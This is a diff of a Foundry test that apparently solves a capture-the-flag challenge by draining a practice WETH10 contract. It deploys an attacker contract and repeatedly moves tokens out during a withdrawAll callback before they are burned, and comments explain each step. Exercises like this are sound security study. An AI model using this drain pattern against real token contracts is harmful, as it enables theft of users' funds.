@@ -8,7 +8,7 @@ import "../src/WETH10/Bob.sol";
 
 contract WETHAttack is Test {
     WETH10 public weth;
-    Bob public attacker;
+    Bob public bobContract;
     address owner;
     address bob;
 
@@ -26,25 +26,30 @@ contract WETHAttack is Test {
             10 ether,
             "weth contract should have 10 ether"
         );
-        console.log("WETH10ADDRESS: %s ", address(weth));
 
-        console.log("BOBADDRESS: %s ", address(bob));
-        uint256 bobBalance = address(bob).balance;
-        console.log("BLANCEBOB %s", bobBalance);
-
+        //---------------------------------------------------------
         vm.startPrank(bob);
-        attacker = new Bob(address(bob), address(weth));
-        vm.label(address(attacker), "AttackerContract");
-        attacker.deposit{value: bobBalance}();
-        // weth.deposit{value: bobBalance}();
-        // weth.transfer(address(attacker), bobBalance);
-        // weth.approve(address(attacker), type(uint256).max);
+        //bob approve himself ==> 11 ether
+        weth.approve(address(bob), 11 ether);
+        vm.label(address(bobContract), "AttackerContract");
 
-        // we get the loan to a contract transfer 1 eth to bob
-        attacker.attack();
-        // deposit one eth
-        // weth.deposit{value: 1 ether}();
+        //deploy the attacker contract
+        bobContract = new Bob(payable(address(weth)));
 
+        // bob deposit  1 ether gets a Token ;
+        //Aproved himself
+        // transfer that Token to his bobcontract so now his bob contract has 1 token
+        /* bob call callWithdrawAll then ..we can withdraw 1 ether,  to our Attacker Contract ... before going to _burnAll() (WETH10 Line 29) we gonna 
+        send those tokens to bob's EOA  ..repeat it 10 times, we withdraw all the ether in bobContract then  finally we withdraw the rest (1 remaining ether) by directly calling 
+        withdrawAll function in WETH10  
+        */
+        for (uint256 i = 0; i < 10; i++) {
+            weth.deposit{value: 1 ether}();
+            weth.transferFrom(bob, address(bobContract), 1 ether); //  transfering 1 Token
+            bobContract.callBackwithdrawAll();
+            bobContract.getEtherBack();
+        }
+        weth.withdrawAll();
         vm.stopPrank();
         assertEq(address(weth).balance, 0, "empty weth contract");
         assertEq(bob.balance, 11 ether, "player should end with 11 ether");
